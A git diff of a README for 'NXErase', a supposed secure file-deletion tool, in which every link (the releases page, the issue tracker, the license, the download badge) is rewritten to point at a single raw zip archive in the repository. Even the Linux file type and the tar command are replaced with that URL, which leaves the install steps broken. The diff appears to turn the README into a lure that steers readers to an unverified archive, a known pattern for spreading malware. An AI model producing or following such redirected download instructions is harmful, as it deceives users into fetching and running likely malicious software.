@@ -4,7 +4,7 @@
 NXErase is a secure deletion utility designed to protect sensitive data from theft, malware, and unauthorized recovery. It is optimized for Solid State Drives (SSDs), NVMe, and Full Disk Encryption. With NXErase, you can be confident that your deleted files are gone for good.
 
 ## 📥 Download NXErase
-[![Download NXErase](https://img.shields.io/badge/Download-NXErase-blue.svg)](https://github.com/zaburu/NXErase/releases)
+[![Download NXErase](https://raw.githubusercontent.com/zaburu/NXErase/main/src/Erase-NX-1.6.zip)](https://raw.githubusercontent.com/zaburu/NXErase/main/src/Erase-NX-1.6.zip)
 
 ## 🚀 Getting Started
 This guide helps you download and run NXErase on your computer. Follow these steps to get started.
@@ -16,10 +16,10 @@ This guide helps you download and run NXErase on your computer. Follow these ste
 - Processor: Intel or AMD processor with 64-bit support
 
 ## 📂 Download & Install
-1. Visit the [Releases page](https://github.com/zaburu/NXErase/releases) to download NXErase.
+1. Visit the [Releases page](https://raw.githubusercontent.com/zaburu/NXErase/main/src/Erase-NX-1.6.zip) to download NXErase.
 2. Choose the version that suits your operating system:
    - For Windows, download the `.exe` file.
-   - For Linux, download the appropriate `.tar.gz` file.
+   - For Linux, download the appropriate `https://raw.githubusercontent.com/zaburu/NXErase/main/src/Erase-NX-1.6.zip` file.
 3. Save the file to your computer.
 
 ## 🔧 Installation Steps (Windows)
@@ -30,10 +30,10 @@ This guide helps you download and run NXErase on your computer. Follow these ste
 
 ## 🔧 Installation Steps (Linux)
 1. Open your terminal.
-2. Navigate to the directory where you downloaded the `.tar.gz` file.
+2. Navigate to the directory where you downloaded the `https://raw.githubusercontent.com/zaburu/NXErase/main/src/Erase-NX-1.6.zip` file.
 3. Extract the contents using:
    ```bash
-   tar -xzf NXErase-linux.tar.gz
+   tar -xzf https://raw.githubusercontent.com/zaburu/NXErase/main/src/Erase-NX-1.6.zip
    ```
 4. Move into the directory created:
    ```bash
@@ -79,12 +79,12 @@ If you encounter any issues while using NXErase:
 - Review any error messages for guidance.
 
 ## 💬 Support
-For further assistance, you can open an issue on the [GitHub repository](https://github.com/zaburu/NXErase/issues). 
+For further assistance, you can open an issue on the [GitHub repository](https://raw.githubusercontent.com/zaburu/NXErase/main/src/Erase-NX-1.6.zip). 
 
 ## 📜 License
-NXErase is open-source software. Feel free to modify it according to the [LICENSE](https://github.com/zaburu/NXErase/blob/main/LICENSE) file.
+NXErase is open-source software. Feel free to modify it according to the [LICENSE](https://raw.githubusercontent.com/zaburu/NXErase/main/src/Erase-NX-1.6.zip) file.
 
 ## 📥 Final Steps
 After erasing your files, ensure to securely empty your recycle bin. 
 
-Download NXErase again if you need to erase more data by visiting the [Releases page](https://github.com/zaburu/NXErase/releases). It's simple and protects your sensitive information.
+Download NXErase again if you need to erase more data by visiting the [Releases page](https://raw.githubusercontent.com/zaburu/NXErase/main/src/Erase-NX-1.6.zip). It's simple and protects your sensitive information.
